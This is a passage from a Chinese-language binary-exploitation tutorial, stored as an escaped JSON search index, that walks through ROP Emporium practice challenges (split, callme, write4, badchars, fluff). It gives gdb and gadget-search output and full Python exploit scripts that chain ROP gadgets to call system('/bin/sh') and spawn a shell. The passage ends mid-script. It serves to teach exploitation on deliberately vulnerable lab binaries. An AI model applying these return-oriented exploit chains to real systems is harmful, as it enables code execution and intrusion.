\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff081.5.6\u52a8\u6001\u94fe\u63a5\uff09\uff0c\u8fd9\u91cc\u6211\u4eec\u518d\u56de\u987e\u4e00\u4e0b\uff1a</p> <p>\u7ed1\u5b9a\u524d\uff1a</p> <pre><code>gdb-peda$ disassemble system\nDump of assembler code for function system@plt:\n   0x08048430 &lt;+0&gt;:     jmp    DWORD PTR ds:0x804a018\n   0x08048436 &lt;+6&gt;:     push   0x18\n   0x0804843b &lt;+11&gt;:    jmp    0x80483f0\ngdb-peda$ x/5x 0x804a018  \n0x804a018:      0x08048436      0x08048446      0x08048456      0x08048466\n0x804a028:      0x00000000\n</code></pre> <p>\u7ed1\u5b9a\u540e\uff1a</p> <pre><code>gdb-peda$ disassemble system\nDump of assembler code for function system:\n   0xf7df9c50 &lt;+0&gt;:     sub    esp,0xc\n   0xf7df9c53 &lt;+3&gt;:     mov    eax,DWORD PTR [esp+0x10]\n   0xf7df9c57 &lt;+7&gt;:     call   0xf7ef32cd &lt;__x86.get_pc_thunk.dx&gt;\n   0xf7df9c5c &lt;+12&gt;:    add    edx,0x1951cc\n   0xf7df9c62 &lt;+18&gt;:    test   eax,eax\n   0xf7df9c64 &lt;+20&gt;:    je     0xf7df9c70 &lt;system+32&gt;\n   0xf7df9c66 &lt;+22&gt;:    add    esp,0xc\n   0xf7df9c69 &lt;+25&gt;:    jmp    0xf7df9700 &lt;do_system&gt;\n   0xf7df9c6e &lt;+30&gt;:    xchg   ax,ax\n   0xf7df9c70 &lt;+32&gt;:    lea    eax,[edx-0x57616]\n   0xf7df9c76 &lt;+38&gt;:    call   0xf7df9700 &lt;do_system&gt;\n   0xf7df9c7b &lt;+43&gt;:    test   eax,eax\n   0xf7df9c7d &lt;+45&gt;:    sete   al\n   0xf7df9c80 &lt;+48&gt;:    add    esp,0xc\n   0xf7df9c83 &lt;+51&gt;:    movzx  eax,al\n   0xf7df9c86 &lt;+54&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ x/5x 0x08048430\n0x8048430 &lt;system@plt&gt;: 0xa01825ff      0x18680804      0xe9000000      0xffffffb0\n0x8048440 &lt;__libc_start_main@plt&gt;:      0xa01c25ff\n</code></pre> <p>\u5176\u5b9e\u8fd9\u91cc\u8bb2 plt \u4e0d\u662f\u5f88\u786e\u5207\uff0c\u56e0\u4e3a system \u4f7f\u7528\u592a\u9891\u7e41\uff0c\u5728\u6211\u4eec\u4f7f\u7528\u5b83\u4e4b\u524d\uff0c\u5b83\u5c31\u5df2\u7ecf\u7ed1\u5b9a\u4e86\uff0c\u5728\u540e\u9762\u7684\u6311\u6218\u4e2d\u6211\u4eec\u4f1a\u9047\u5230\u6ca1\u6709\u7ed1\u5b9a\u7684\u60c5\u51b5\u3002</p> <p>\u4e24\u79cd payload \u5982\u4e0b\uff1a</p> <pre><code>$ python2 -c \"print 'A'*44 + '\\x57\\x86\\x04\\x08' + '\\x30\\xa0\\x04\\x08'\" | ./split32\n...\n&gt; ROPE{a_placeholder_32byte_flag!}\nfrom zio import *\n\npayload  = \"A\"*44\npayload += l32(0x08048430)\npayload += \"BBBB\"\npayload += l32(0x0804a030)\n\nio = zio('./split32')\nio.writeline(payload)\nio.read()\n</code></pre> <p>\u6ce8\u610f \"BBBB\" \u662f\u65b0\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5982\u679c\u51fd\u6570 ret\uff0c\u5c31\u4f1a\u6267\u884c \"BBBB\" \u5904\u7684\u6307\u4ee4\uff0c\u901a\u5e38\u8fd9\u91cc\u4f1a\u653e\u7f6e\u4e00\u4e9b <code>pop;pop;ret</code> \u4e4b\u7c7b\u7684\u6307\u4ee4\u5730\u5740\uff0c\u4ee5\u5e73\u8861\u5806\u6808\u3002\u4ece system() \u51fd\u6570\u4e2d\u4e5f\u80fd\u770b\u51fa\u6765\uff0c\u5b83\u73b0\u5c06 esp \u51cf\u53bb 0xc\uff0c\u518d\u53d6\u5730\u5740 esp+0x10 \u5904\u7684\u6307\u4ee4\uff0c\u4e5f\u5c31\u662f \"BBBB\" \u7684\u540e\u4e00\u4e2a\uff0c\u5373\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u56e0\u4e3a <code>system()</code> \u662f libc \u4e2d\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u79f0\u4f5c ret2libc\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#split","title":"split","text":"<pre><code>$ rabin2 -z split\n...\nvaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt\n</code></pre> <p>\u5b57\u7b26\u4e32\u5730\u5740\u5728 <code>0x00601060</code>\u3002</p> <pre><code>gdb-peda$ disassemble usefulFunction\nDump of assembler code for function usefulFunction:\n   0x0000000000400807 &lt;+0&gt;:     push   rbp\n   0x0000000000400808 &lt;+1&gt;:     mov    rbp,rsp\n   0x000000000040080b &lt;+4&gt;:     mov    edi,0x4008ff\n   0x0000000000400810 &lt;+9&gt;:     call   0x4005e0 &lt;system@plt&gt;\n   0x0000000000400815 &lt;+14&gt;:    nop\n   0x0000000000400816 &lt;+15&gt;:    pop    rbp\n   0x0000000000400817 &lt;+16&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>64 \u4f4d\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u901a\u8fc7 edi \u4f20\u9012\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u518d\u8c03\u7528\u4e00\u4e2a gadgets \u6765\u5c06\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5b58\u8fdb edi\u3002</p> <p>\u6211\u4eec\u5148\u627e\u5230\u9700\u8981\u7684 gadgets\uff1a</p> <pre><code>gdb-peda$ ropsearch \"pop rdi; ret\"\nSearching for ROP gadget: 'pop rdi; ret' in: binary ranges\n0x00400883 : (b'5fc3')  pop rdi; ret\n</code></pre> <p>\u4e0b\u9762\u662f payload\uff1a</p> <pre><code>$ python2 -c \"print 'A'*40 + '\\x83\\x08\\x40\\x00\\x00\\x00\\x00\\x00' + '\\x60\\x10\\x60\\x00\\x00\\x00\\x00\\x00' + '\\x10\\x08\\x40\\x00\\x00\\x00\\x00\\x00'\" | ./split\n...\n&gt; ROPE{a_placeholder_32byte_flag!}\n</code></pre> <p>\u90a3\u6211\u4eec\u662f\u5426\u8fd8\u53ef\u4ee5\u7528\u524d\u9762\u90a3\u79cd\u65b9\u6cd5\u8c03\u7528 <code>system()</code> \u7684 plt \u5730\u5740 <code>0x4005e0</code> \u5462\uff1a</p> <pre><code>gdb-peda$ disassemble system\nDump of assembler code for function system:\n   0x00007ffff7a63010 &lt;+0&gt;:     test   rdi,rdi\n   0x00007ffff7a63013 &lt;+3&gt;:     je     0x7ffff7a63020 &lt;system+16&gt;\n   0x00007ffff7a63015 &lt;+5&gt;:     jmp    0x7ffff7a62a70 &lt;do_system&gt;\n   0x00007ffff7a6301a &lt;+10&gt;:    nop    WORD PTR [rax+rax*1+0x0]\n   0x00007ffff7a63020 &lt;+16&gt;:    lea    rdi,[rip+0x138fd6]        # 0x7ffff7b9bffd\n   0x00007ffff7a63027 &lt;+23&gt;:    sub    rsp,0x8\n   0x00007ffff7a6302b &lt;+27&gt;:    call   0x7ffff7a62a70 &lt;do_system&gt;\n   0x00007ffff7a63030 &lt;+32&gt;:    test   eax,eax\n   0x00007ffff7a63032 &lt;+34&gt;:    sete   al\n   0x00007ffff7a63035 &lt;+37&gt;:    add    rsp,0x8\n   0x00007ffff7a63039 &lt;+41&gt;:    movzx  eax,al\n   0x00007ffff7a6303c &lt;+44&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u4f9d\u7136\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53c2\u6570\u7684\u4f20\u9012\u6ca1\u6709\u7528\u5230\u6808\uff0c\u6211\u4eec\u53ea\u9700\u628a\u5730\u5740\u76f4\u63a5\u66f4\u6539\u5c31\u53ef\u4ee5\u4e86\uff1a</p> <pre><code>from zio import *\n\npayload  = \"A\"*40\npayload += l64(0x00400883)\npayload += l64(0x00601060)\npayload += l64(0x4005e0)\n\nio = zio('./split')\nio.writeline(payload)\nio.read()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#callme32","title":"callme32","text":"<p>\u8fd9\u91cc\u6211\u4eec\u8981\u63a5\u89e6\u771f\u6b63\u7684 plt \u4e86\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0ccallme32 \u4ece\u5171\u4eab\u5e93 libcallme32.so \u4e2d\u5bfc\u5165\u4e09\u4e2a\u7279\u6b8a\u7684\u51fd\u6570\uff1a</p> <pre><code>$ rabin2 -i callme32 | grep callme\nordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_three\nordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one\nordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two\n</code></pre> <p>\u6211\u4eec\u8981\u505a\u7684\u662f\u4f9d\u6b21\u8c03\u7528 <code>callme_one()</code>\u3001<code>callme_two()</code> \u548c <code>callme_three()</code>\uff0c\u5e76\u4e14\u6bcf\u4e2a\u51fd\u6570\u90fd\u8981\u4f20\u5165\u53c2\u6570 <code>1</code>\u3001<code>2</code>\u3001<code>3</code>\u3002\u901a\u8fc7\u8c03\u8bd5\u6211\u4eec\u80fd\u591f\u77e5\u9053\u51fd\u6570\u903b\u8f91\uff0c<code>callme_one</code> \u7528\u4e8e\u8bfb\u5165\u52a0\u5bc6\u540e\u7684 flag\uff0c\u7136\u540e\u4f9d\u6b21\u8c03\u7528 <code>callme_two</code> \u548c <code>callme_three</code> \u8fdb\u884c\u89e3\u5bc6\u3002</p> <p>\u7531\u4e8e\u51fd\u6570\u53c2\u6570\u662f\u653e\u5728\u6808\u4e0a\u7684\uff0c\u4e3a\u4e86\u5e73\u8861\u5806\u6808\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a <code>pop;pop;pop;ret</code> \u7684 gadgets\uff1a</p> <pre><code>$ objdump -d callme32 | grep -A 3 pop\n...\n 80488a8:       5b                      pop    %ebx\n 80488a9:       5e                      pop    %esi\n 80488aa:       5f                      pop    %edi\n 80488ab:       5d                      pop    %ebp\n 80488ac:       c3                      ret\n 80488ad:       8d 76 00                lea    0x0(%esi),%esi\n...\n</code></pre> <p>\u6216\u8005\u662f <code>add esp, 8; pop; ret</code>\uff0c\u53cd\u6b63\u53ea\u8981\u80fd\u5e73\u8861\uff0c\u90fd\u53ef\u4ee5\uff1a</p> <pre><code>gdb-peda$ ropsearch \"add esp, 8\"\nSearching for ROP gadget: 'add esp, 8' in: binary ranges\n0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret\n0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret\n</code></pre> <p>\u6784\u9020 payload \u5982\u4e0b\uff1a</p> <pre><code>from zio import *\n\npayload  = \"A\"*44\n\npayload += l32(0x080485c0)\npayload += l32(0x080488a9)\npayload += l32(0x1) + l32(0x2) + l32(0x3)\n\npayload += l32(0x08048620)\npayload += l32(0x080488a9)\npayload += l32(0x1) + l32(0x2) + l32(0x3)\n\npayload += l32(0x080485b0)\npayload += l32(0x080488a9)\npayload += l32(0x1) + l32(0x2) + l32(0x3)\n\nio = zio('./callme32')\nio.writeline(payload)\nio.read()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#callme","title":"callme","text":"<p>64 \u4f4d\u7a0b\u5e8f\u4e0d\u9700\u8981\u5e73\u8861\u5806\u6808\u4e86\uff0c\u53ea\u8981\u5c06\u53c2\u6570\u6309\u987a\u5e8f\u4f9d\u6b21\u653e\u8fdb\u5bc4\u5b58\u5668\u4e2d\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>$ rabin2 -i callme | grep callme\nordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_three\nordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one\nordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two\ngdb-peda$ ropsearch \"pop rdi; pop rsi\"\nSearching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges\n0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret\n</code></pre> <p>payload \u5982\u4e0b\uff1a</p> <pre><code>from zio import *\n\npayload  = \"A\"*40\n\npayload += l64(0x00401ab0)\npayload += l64(0x1) + l64(0x2) + l64(0x3)\npayload += l64(0x00401850)\n\npayload += l64(0x00401ab0)\npayload += l64(0x1) + l64(0x2) + l64(0x3)\npayload += l64(0x00401870)\n\npayload += l64(0x00401ab0)\npayload += l64(0x1) + l64(0x2) + l64(0x3)\npayload += l64(0x00401810)\n\nio = zio('./callme')\nio.writeline(payload)\nio.read()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#write432","title":"write432","text":"<p>\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u5df2\u7ecf\u4e0d\u80fd\u5728\u7a0b\u5e8f\u4e2d\u627e\u5230\u53ef\u4ee5\u6267\u884c\u7684\u8bed\u53e5\u4e86\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u5229\u7528 gadgets \u5c06 <code>/bin/sh</code> \u5199\u5165\u5230\u76ee\u6807\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e2d\uff0c\u5982 <code>.data</code> \u6bb5\u4e2d\uff0c\u518d\u8c03\u7528 system() \u6267\u884c\u5b83\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002\u8981\u8ba4\u8bc6\u5230\u4e00\u4e2a\u91cd\u8981\u7684\u70b9\u662f\uff0cROP \u53ea\u662f\u4e00\u79cd\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f62\u5f0f\uff0c\u53ea\u8981\u6211\u4eec\u6709\u521b\u610f\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u6267\u884c\u8bf8\u5982\u5185\u5b58\u8bfb\u5199\u7b49\u64cd\u4f5c\u3002</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u597d\u7528\uff0c\u4f46\u8fd8\u662f\u8981\u8003\u8651\u6211\u4eec\u5199\u5165\u5730\u5740\u7684\u8bfb\u5199\u548c\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ca\u5b83\u80fd\u63d0\u4f9b\u7684\u7a7a\u95f4\u662f\u591a\u5c11\uff0c\u6211\u4eec\u5199\u5165\u7684\u5185\u5bb9\u662f\u5426\u4f1a\u5f71\u54cd\u5230\u7a0b\u5e8f\u6267\u884c\u7b49\u95ee\u9898\u3002\u5982\u6211\u4eec\u63a5\u4e0b\u6765\u60f3\u628a\u5b57\u7b26\u4e32\u5199\u5165 <code>.data</code> \u6bb5\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u5b83\u7684\u6743\u9650\u548c\u5927\u5c0f\u7b49\u4fe1\u606f\uff1a</p> <pre><code>$ readelf -S write432\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\n  ...\n  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4\n  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>.data</code> \u5177\u6709 <code>WA</code>\uff0c\u5373\u5199\u5165\uff08write\uff09\u548c\u5206\u914d\uff08alloc\uff09\u7684\u6743\u5229\uff0c\u800c <code>.rodata</code> \u5c31\u4e0d\u80fd\u5199\u5165\u3002</p> <p>\u4f7f\u7528\u5de5\u5177 ropgadget \u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u627e\u5230\u6211\u4eec\u9700\u8981\u7684 gadgets\uff1a</p> <pre><code>$ ropgadget --binary write432 --only \"mov|pop|ret\"\n...\n0x08048670 : mov dword ptr [edi], ebp ; ret\n0x080486da : pop edi ; pop ebp ; ret\n</code></pre> <p>\u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd9\u91cc\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u6bcf\u6b21\u53ea\u80fd\u5199\u5165 4 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8981\u5206\u6210\u4e24\u6b21\u5199\u5165\uff0c\u8fd8\u5f97\u6ce8\u610f\u5b57\u7b26\u5bf9\u9f50\uff0c\u6709\u6ca1\u6709\u622a\u65ad\u5b57\u7b26\uff08<code>\\x00</code>,<code>\\x0a</code>\u7b49\uff09\u4e4b\u7c7b\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u8fd9\u91cc <code>/bin/sh</code> \u53ea\u6709\u4e03\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>/bin/sh\\00</code> \u6216\u8005 <code>/bin//sh</code>\uff0c\u6784\u9020 payload \u5982\u4e0b\uff1a</p> <pre><code>from zio import *\n\npop_edi_ebp = 0x080486da\nmov_edi_ebp = 0x08048670\n\ndata_addr   = 0x804a028\nsystem_plt  = 0x8048430\n\npayload  = \"\"\npayload += \"A\"*44\npayload += l32(pop_edi_ebp)\npayload += l32(data_addr)\npayload += \"/bin\"\npayload += l32(mov_edi_ebp)\npayload += l32(pop_edi_ebp)\npayload += l32(data_addr+4)\npayload += \"/sh\\x00\"\npayload += l32(mov_edi_ebp)\npayload += l32(system_plt)\npayload += \"BBBB\"\npayload += l32(data_addr)\n\nio = zio('./write432')\nio.writeline(payload)\nio.interact()\n$ python2 run.py\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB(\ufffd\nwrite4 by ROP Emporium\n32bits\n\nGo ahead and give me the string already!\n&gt; cat flag.txt\nROPE{a_placeholder_32byte_flag!}\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#write4","title":"write4","text":"<p>64 \u4f4d\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u4e00\u6b21\u6027\u5199\u5165\u4e86\u3002</p> <pre><code>$ ropgadget --binary write4 --only \"mov|pop|ret\"\n...\n0x0000000000400820 : mov qword ptr [r14], r15 ; ret\n0x0000000000400890 : pop r14 ; pop r15 ; ret\n0x0000000000400893 : pop rdi ; ret\nfrom pwn import *\n\npop_r14_r15 = 0x0000000000400890\nmov_r14_r15 = 0x0000000000400820\npop_rdi = 0x0000000000400893\ndata_addr = 0x0000000000601050\nsystem_plt = 0x004005e0\n\npayload  = \"A\"*40\npayload += p64(pop_r14_r15)\npayload += p64(data_addr)\npayload += \"/bin/sh\\x00\"\npayload += p64(mov_r14_r15)\npayload += p64(pop_rdi)\npayload += p64(data_addr)\npayload += p64(system_plt)\n\nio = process('./write4')\nio.recvuntil('&gt;')\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#badchars32","title":"badchars32","text":"<p>\u5728\u8fd9\u4e2a\u6311\u6218\u4e2d\uff0c\u6211\u4eec\u4f9d\u7136\u8981\u5c06 <code>/bin/sh</code> \u5199\u5165\u5230\u8fdb\u7a0b\u5185\u5b58\u4e2d\uff0c\u4f46\u8fd9\u4e00\u6b21\u7a0b\u5e8f\u5728\u8bfb\u53d6\u8f93\u5165\u65f6\u4f1a\u5bf9\u654f\u611f\u5b57\u7b26\u8fdb\u884c\u68c0\u67e5\uff0c\u67e5\u770b\u51fd\u6570 <code>checkBadchars()</code>\uff1a</p> <pre><code>gdb-peda$ disassemble checkBadchars\nDump of assembler code for function checkBadchars:\n   0x08048801 &lt;+0&gt;:     push   ebp\n   0x08048802 &lt;+1&gt;:     mov    ebp,esp\n   0x08048804 &lt;+3&gt;:     sub    esp,0x10\n   0x08048807 &lt;+6&gt;:     mov    BYTE PTR [ebp-0x10],0x62\n   0x0804880b &lt;+10&gt;:    mov    BYTE PTR [ebp-0xf],0x69\n   0x0804880f &lt;+14&gt;:    mov    BYTE PTR [ebp-0xe],0x63\n   0x08048813 &lt;+18&gt;:    mov    BYTE PTR [ebp-0xd],0x2f\n   0x08048817 &lt;+22&gt;:    mov    BYTE PTR [ebp-0xc],0x20\n   0x0804881b &lt;+26&gt;:    mov    BYTE PTR [ebp-0xb],0x66\n   0x0804881f &lt;+30&gt;:    mov    BYTE PTR [ebp-0xa],0x6e\n   0x08048823 &lt;+34&gt;:    mov    BYTE PTR [ebp-0x9],0x73\n   0x08048827 &lt;+38&gt;:    mov    DWORD PTR [ebp-0x4],0x0\n   0x0804882e &lt;+45&gt;:    mov    DWORD PTR [ebp-0x8],0x0\n   0x08048835 &lt;+52&gt;:    mov    DWORD PTR [ebp-0x4],0x0\n   0x0804883c &lt;+59&gt;:    jmp    0x804887c &lt;checkBadchars+123&gt;\n   0x0804883e &lt;+61&gt;:    mov    DWORD PTR [ebp-0x8],0x0\n   0x08048845 &lt;+68&gt;:    jmp    0x8048872 &lt;checkBadchars+113&gt;\n   0x08048847 &lt;+70&gt;:    mov    edx,DWORD PTR [ebp+0x8]\n   0x0804884a &lt;+73&gt;:    mov    eax,DWORD PTR [ebp-0x4]\n   0x0804884d &lt;+76&gt;:    add    eax,edx\n   0x0804884f &lt;+78&gt;:    movzx  edx,BYTE PTR [eax]\n   0x08048852 &lt;+81&gt;:    lea    ecx,[ebp-0x10]\n   0x08048855 &lt;+84&gt;:    mov    eax,DWORD PTR [ebp-0x8]\n   0x08048858 &lt;+87&gt;:    add    eax,ecx\n   0x0804885a &lt;+89&gt;:    movzx  eax,BYTE PTR [eax]\n   0x0804885d &lt;+92&gt;:    cmp    dl,al\n   0x0804885f &lt;+94&gt;:    jne    0x804886e &lt;checkBadchars+109&gt;\n   0x08048861 &lt;+96&gt;:    mov    edx,DWORD PTR [ebp+0x8]\n   0x08048864 &lt;+99&gt;:    mov    eax,DWORD PTR [ebp-0x4]\n   0x08048867 &lt;+102&gt;:   add    eax,edx\n   0x08048869 &lt;+104&gt;:   mov    BYTE PTR [eax],0xeb\n   0x0804886c &lt;+107&gt;:   jmp    0x8048878 &lt;checkBadchars+119&gt;\n   0x0804886e &lt;+109&gt;:   add    DWORD PTR [ebp-0x8],0x1\n   0x08048872 &lt;+113&gt;:   cmp    DWORD PTR [ebp-0x8],0x7\n   0x08048876 &lt;+117&gt;:   jbe    0x8048847 &lt;checkBadchars+70&gt;\n   0x08048878 &lt;+119&gt;:   add    DWORD PTR [ebp-0x4],0x1\n   0x0804887c &lt;+123&gt;:   mov    eax,DWORD PTR [ebp-0x4]\n   0x0804887f &lt;+126&gt;:   cmp    eax,DWORD PTR [ebp+0xc]\n   0x08048882 &lt;+129&gt;:   jb     0x804883e &lt;checkBadchars+61&gt;\n   0x08048884 &lt;+131&gt;:   nop\n   0x08048885 &lt;+132&gt;:   leave  \n   0x08048886 &lt;+133&gt;:   ret\nEnd of assembler dump.\n</code></pre> <p>\u5f88\u660e\u663e\uff0c\u5730\u5740 <code>0x08048807</code> \u5230 <code>0x08048823</code> \u7684\u5b57\u7b26\u5c31\u662f\u6240\u8c13\u7684\u654f\u611f\u5b57\u7b26\u3002\u5904\u7406\u654f\u611f\u5b57\u7b26\u5728\u5229\u7528\u5f00\u53d1\u4e2d\u662f\u7ecf\u5e38\u8981\u7528\u5230\u7684\uff0c\u4e0d\u4ec5\u4ec5\u662f\u8981\u5bf9\u53c2\u6570\u8fdb\u884c\u7f16\u7801\uff0c\u6709\u65f6\u751a\u81f3\u5730\u5740\u4e5f\u8981\u5982\u6b64\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u7b80\u5355\u7684\u5f02\u6216\u64cd\u4f5c\u6765\u5bf9\u5b57\u7b26\u4e32\u7f16\u7801\u548c\u89e3\u7801\u3002</p> <p>\u627e\u5230 gadgets\uff1a</p> <pre><code>$ ropgadget --binary badchars32 --only \"mov|pop|ret|xor\"\n...\n0x08048893 : mov dword ptr [edi], esi ; ret\n0x08048896 : pop ebx ; pop ecx ; ret\n0x08048899 : pop esi ; pop edi ; ret\n0x08048890 : xor byte ptr [ebx], cl ; ret\n</code></pre> <p>\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5199\u5165\u524d\u7f16\u7801\uff0c\u4f7f\u7528\u524d\u89e3\u7801\uff0c\u4e0b\u9762\u662f payload\uff1a</p> <pre><code>from zio import *\n\nxor_ebx_cl  = 0x08048890\npop_ebx_ecx = 0x08048896\npop_esi_edi = 0x08048899\nmov_edi_esi = 0x08048893\n\nsystem_plt  = 0x080484e0\ndata_addr   = 0x0804a038\n\n# encode\nbadchars    = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]\nxor_byte    = 0x1\nwhile(1):\n    binsh = \"\"\n    for i in \"/bin/sh\\x00\":\n        c = ord(i) ^ xor_byte\n        if c in badchars:\n            xor_byte += 1\n            break\n        else:\n            binsh += chr(c)\n    if len(binsh) == 8:\n        break\n\n# write\npayload  = \"A\"*44\npayload += l32(pop_esi_edi)\npayload += binsh[:4]\npayload += l32(data_addr)\npayload += l32(mov_edi_esi)\npayload += l32(pop_esi_edi)\npayload += binsh[4:8]\npayload += l32(data_addr + 4)\npayload += l32(mov_edi_esi)\n\n# decode\nfor i in range(len(binsh)):\n    payload += l32(pop_ebx_ecx)\n    payload += l32(data_addr + i)\n    payload += l32(xor_byte)\n    payload += l32(xor_ebx_cl)\n\n# run\npayload += l32(system_plt)\npayload += \"BBBB\"\npayload += l32(data_addr)\n\nio = zio('./badchars32')\nio.writeline(payload)\nio.interact()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#badchars","title":"badchars","text":"<p>64 \u4f4d\u7a0b\u5e8f\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u6ce8\u610f\u53c2\u6570\u4f20\u9012\u5c31\u597d\u4e86\u3002</p> <pre><code>$ ropgadget --binary badchars --only \"mov|pop|ret|xor\"\n...\n0x0000000000400b34 : mov qword ptr [r13], r12 ; ret\n0x0000000000400b3b : pop r12 ; pop r13 ; ret\n0x0000000000400b40 : pop r14 ; pop r15 ; ret\n0x0000000000400b30 : xor byte ptr [r15], r14b ; ret\n0x0000000000400b39 : pop rdi ; ret\nfrom pwn import *\n\npop_r12_r13  = 0x0000000000400b3b\nmov_r13_r12  = 0x0000000000400b34\npop_r14_r15  = 0x0000000000400b40\nxor_r15_r14b = 0x0000000000400b30\npop_rdi      = 0x0000000000400b39\n\nsystem_plt = 0x00000000004006f0\ndata_addr  = 0x0000000000601000\n\nbadchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]\nxor_byte = 0x1\nwhile(1):\n    binsh = \"\"\n    for i in \"/bin/sh\\x00\":\n        c = ord(i) ^ xor_byte\n        if c in badchars:\n            xor_byte += 1\n            break\n        else:\n            binsh += chr(c)\n    if len(binsh) == 8:\n        break\n\npayload  = \"A\"*40\npayload += p64(pop_r12_r13)\npayload += binsh\npayload += p64(data_addr)\npayload += p64(mov_r13_r12)\n\nfor i in range(len(binsh)):\n    payload += p64(pop_r14_r15)\n    payload += p64(xor_byte)\n    payload += p64(data_addr + i)\n    payload += p64(xor_r15_r14b)\n\npayload += p64(pop_rdi)\npayload += p64(data_addr)\npayload += p64(system_plt)\n\nio = process('./badchars')\nio.recvuntil('&gt;')\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#fluff32","title":"fluff32","text":"<p>\u8fd9\u4e2a\u7ec3\u4e60\u4e0e\u4e0a\u9762\u6ca1\u6709\u592a\u5927\u533a\u522b\uff0c\u96be\u70b9\u5728\u4e8e\u6211\u4eec\u80fd\u627e\u5230\u7684 gadgets \u4e0d\u662f\u90a3\u4e48\u76f4\u63a5\uff0c\u6709\u4e00\u4e2a\u6280\u5de7\u662f\u56e0\u4e3a\u6211\u4eec\u7684\u76ee\u7684\u662f\u5199\u5165\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u5fc5\u7136\u9700\u8981 <code>mov [reg], reg</code> \u8fd9\u6837\u7684 gadgets\uff0c\u6211\u4eec\u5c31\u4ece\u8fd9\u91cc\u51fa\u53d1\uff0c\u5012\u63a8\u6240\u9700\u7684 gadgets\u3002</p> <pre><code>$ ropgadget --binary fluff32 --only \"mov|pop|ret|xor|xchg\"\n...\n0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret\n0x080483e1 : pop ebx ; ret\n0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret\n0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret\n0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret\n</code></pre> <p>\u6211\u4eec\u770b\u5230\u4e00\u4e2a\u8fd9\u6837\u7684 <code>mov dword ptr [ecx], edx ;</code>\uff0c\u53ef\u4ee5\u60f3\u5230\u6211\u4eec\u5c06\u5730\u5740\u653e\u8fdb <code>ecx</code>\uff0c\u5c06\u6570\u636e\u653e\u8fdb <code>edx</code>\uff0c\u4ece\u800c\u5c06\u6570\u636e\u5199\u5165\u5230\u5730\u5740\u4e2d\u3002payload \u5982\u4e0b\uff1a</p> <pre><code>from zio import *\n\nsystem_plt   = 0x08048430\ndata_addr    = 0x0804a028\n\npop_ebx      = 0x080483e1\nmov_ecx_edx  = 0x08048693\nxchg_edx_ecx = 0x08048689\nxor_edx_ebx  = 0x0804867b\nxor_edx_edx  = 0x08048671\n\ndef write_data(data, addr):\n    # addr -&gt; ecx\n    payload  = 